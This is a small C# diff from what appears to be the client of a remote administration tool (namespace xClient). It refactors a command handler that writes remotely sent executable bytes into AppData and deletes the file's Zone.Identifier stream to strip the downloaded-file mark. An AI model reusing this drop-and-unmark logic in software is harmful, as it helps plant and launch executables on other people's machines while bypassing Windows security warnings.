@@ -94,15 +94,14 @@ namespace xClient.Core.Commands
 		{
 			new Thread(new ThreadStart(() =>
 			{
-				byte[] fileBytes = command.FileBytes;
 				string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), command.FileName);
 
 				try
 				{
-					if (fileBytes[0] != 'M' && fileBytes[1] != 'Z')
+					if (command.FileBytes[0] != 'M' && command.FileBytes[1] != 'Z')
 						throw new Exception("no pe file");
 
-					File.WriteAllBytes(tempFile, fileBytes);
+					File.WriteAllBytes(tempFile, command.FileBytes);
 
 					DeleteFile(tempFile + ":Zone.Identifier");
 
